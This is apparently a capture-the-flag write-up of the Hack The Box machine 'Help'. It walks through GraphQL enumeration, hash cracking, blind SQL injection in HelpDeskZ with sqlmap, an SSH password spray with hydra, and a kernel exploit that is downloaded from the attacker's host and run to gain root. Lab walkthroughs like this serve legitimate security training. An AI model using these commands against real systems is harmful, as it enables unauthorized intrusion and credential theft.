---
layout: post
title: "[HTB] Help"
description: "[Machine] - Easy difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---

![](/img/htb_img/Help_img/img1.png)

- Box: Help
- OS: Linux
- Release Date: 19 Jan 2019
- Difficulty: Easy

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 14:06 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.044s latency).
Not shown: 63481 closed tcp ports (reset), 2051 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 12.48 seconds
```

Scripts and versions.
```
❯ nmap -p22,80,3000 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 14:07 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.043s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://help.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.69 seconds
```

We obtained a domain: `help.htb`.
```
❯ echo "$target help.htb" | sudo tee -a /etc/hosts
10.129.xx.xx help.htb
```
---

## TCP 80: HTTP
![](/img/htb_img/Help_img/img2.png)

The domain `help.htb` resolves to a default apache2 config page, with the codename for Ubuntu.
```
❯ whatweb $target
http://help.htb/ [200 OK] HTTPServer[Apache/2.4.18 (Ubuntu)] IP[10.129.xx.xx]  Title[Apache2 Ubuntu Default Page: It works]
```

### Fuzzing web
Let's try to find hidden directories on the web:
```
❯ gobuster dir -u http://help.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://help.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/support              (Status: 301) [Size: 306] [--> http://help.htb/support/]
/javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]
```

Let's navigate to these directories and see what is there.

### Javascript endpoint
![](/img/htb_img/Help_img/img4.png)
Apparently we can't check the `/javascript` endpoint, so let's keep going.

### Support endpoint
![](/img/htb_img/Help_img/img5.png)
This endpoint has something more interesting, a `HelpDeskZ` instance. We can't do much without an account and we can't register one.


## TCP 3000: GraphQL
```
❯ curl $target:3000
{"message":"Hi Shiv, To get access please find the credentials with given query"}%
```

Let's try some endpoints for queries:
```
❯ curl $target:3000/thing
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /thing</pre>
</body>
</html>

❯ curl $target:3000/sql
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /sql</pre>
</body>
</html>

❯ curl $target:3000/graphql
GET query missing.
```

So, it is a `GraphQL` instance.
It says that we need to make a GET request with a query, let's search for a bit and find out how to do that.

Example curl found:
```
curl -s $target:3000/graphql \
-H "Content-Type: application/json" \
-d '{ "query": "{ __schema { queryType { name, fields { name, description } } } }" }' | jq -c .
```

Let's run it:
```
❯ curl -s $target:3000/graphql \
-H "Content-Type: application/json" \
-d '{ "query": "{ __schema { queryType { name, fields { name, description } } } }" }' | jq
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query",
        "fields": [
          {
            "name": "user",
            "description": ""
          }
        ]
      }
    }
  }
}
```

Let's now check for the user fields:
```
❯ curl -s $target:3000/graphql \
-H "Content-Type: application/json" \
-d '{ "query": "{ __type(name: \"User\") { name fields { name } } }" }' | jq
{
  "data": {
    "__type": {
      "name": "User",
      "fields": [
        {
          "name": "username"
        },
        {
          "name": "password"
        }
      ]
    }
  }
}
```

Let's now make a query to get the usernames and passwords available.
```
❯ curl -s $target:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ user { username password } }" }' | jq

{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```

Let's try to crack this password:
![](/img/htb_img/Help_img/img3.png)
Great, so the account is `helpme@helpme.com:godhelpmeplz`.

# Foothold
## HelpDeskZ login
We can use the credentials we found on the `HelpDeskZ` instance.
![](/img/htb_img/Help_img/img6.png)
Not a lot here to work with, and we don't see a version of the program here. Let's just look for public exploits.

```
❯ searchsploit helpdeskz
--------------------------------------------------------------- ----------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ----------------------
HelpDeskZ 1.0.2 - Arbitrary File Upload                        | php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthoriz | php/webapps/41200.py
Helpdeskz v2.0.2 - Stored XSS                                  | php/webapps/52068.txt
--------------------------------------------------------------- ----------------------
Shellcodes: No Results
```

Cool, let's try the first one.

### Arbitrary File Upload Exploit
```
❯ python 40300.py http://$target/support/ ./test.txt
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
Sorry, I did not find anything
```
After a couple of tries, I couldn't make it work

### Authenticated SQL Injection
This other script also fails to run, so I need to read it carefully and exploit it "manually".
I need to create a ticket with a file attached.
![](/img/htb_img/Help_img/img7.png)

If we see the created ticket:
![](/img/htb_img/Help_img/img8.png)

If I click on the file, it pops a download, the link is the following:
```
http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6
```

If we add `and 1=1-- -` we can trigger a blind sqli.

So, using burpsuite, I captured the request:
```
GET /support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 HTTP/1.1

Host: help.htb

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://help.htb/support/?v=view_tickets&action=ticket&param[]=4

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lang=english; PHPSESSID=05bgvpbr5k9p9a45ab2h497db2; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BGd0Pizv5J0LP1DLEYXRcNanHeC8%2BuetQUv2bMomHEDsg%3D%3D

Connection: keep-alive
```

And saved it to a file, so I can run `sqlmap`.

```
❯ sqlmap -r request.req --level 5 --risk 3 -p "param[]" --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
```

Then dumping the database, obtaining the following info:
```
| 1 | 1 | 1547216217 | support@mysite.com | Enable | NULL | admin | Administrator | <blank> | d318f44739dced66793b1a603028133a76ae680e (Welcome1) | Best regards,\r\nAdministrator | 1543429746 | a:1:{i:0;s:1:"1";} | 0 |
```

Sqlmap was able to obtain the password from the hash `Welcome1`.
I made a directory of possible usernames to make a username spray attack:

```
root
helpme
helpdesk
helpdeskz
support
help
deskz
help.desk
help.desk.z
```

And with hydra we can automate the attack:
```
❯ hydra -L users.txt -p 'Welcome1' ssh://help.htb -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-06 15:01:01
[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:9/p:1), ~3 tries per task
[DATA] attacking ssh://help.htb:22/
[22][ssh] host: help.htb   login: help   password: Welcome1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-06 15:01:07
```

We got a hit: `help/Welcome1`

## Shell as Help
```
❯ ssh help@$target
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
help@10.129.xx.xx's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Fri Jan 11 06:18:50 2019
help@help:~$
```

### User flag
```
help@help:~$ cat user.txt 
<REDACTED>
```

# Privilege Escalation
Checking for the linux kernel:
```
help@help:~$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Let's look for exploits and try several
```
❯ searchsploit Linux kernel 4.4 Local Privilege
--------------------------------------------------------------- -----------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- -----------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege | solaris/local/15962.c
Linux Kernel 2.4.4 < 2.4.37.4 / 2.6.0 < 2.6.30.4 - 'Sendpage'  | linux/local/19933.rb
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Wh | linux/local/9479.c
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedo | linux_x86/local/9542.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalat | linux/local/50135.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE | linux/local/41995.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escala | linux/local/40759.rb
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' R | linux_x86-64/local/40871.c
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escal | linux/local/41458.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_o | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'A | windows_x86-64/local/47170.c
Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyri | linux/local/39277.c
Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyri | linux/local/40003.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_P | linux/local/39772.txt
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation     | linux/local/41886.c
Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege | arm/local/31574.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation   | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local P | linux/local/45553.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privi | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Es | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Lo | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint | linux/local/47169.c
--------------------------------------------------------------- -----------------------------
```

The one that stands out is the one that specifies the version `4.4.0-116`, exactly this:
```
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Es | linux/local/44298.c
```

Let's try this one first.
We download it on the machine:
```
help@help:/tmp$ wget 10.10.xx.xx/44298.c
--2025-12-06 06:06:30--  http://10.10.xx.xx/44298.c
Connecting to 10.10.xx.xx:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5773 (5.6K) [text/x-csrc]
Saving to: ‘44298.c’

44298.c                  100%[===============================>]   5.64K  --.-KB/s    in 0s      

2025-12-06 06:06:30 (447 MB/s) - ‘44298.c’ saved [5773/5773]

help@help:/tmp$
```

Let's compile it and run it:
```
help@help:/tmp$ gcc -o exp 44298.c 
help@help:/tmp$ chmod +x exp 
help@help:/tmp$ ./exp 
task_struct = ffff88003c0bb800
uidptr = ffff880037096e44
spawning root shell
root@help:/tmp# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
```

It works.

### Root flag
```
root@help:/tmp# cat /root/root.txt 
<REDACTED>
```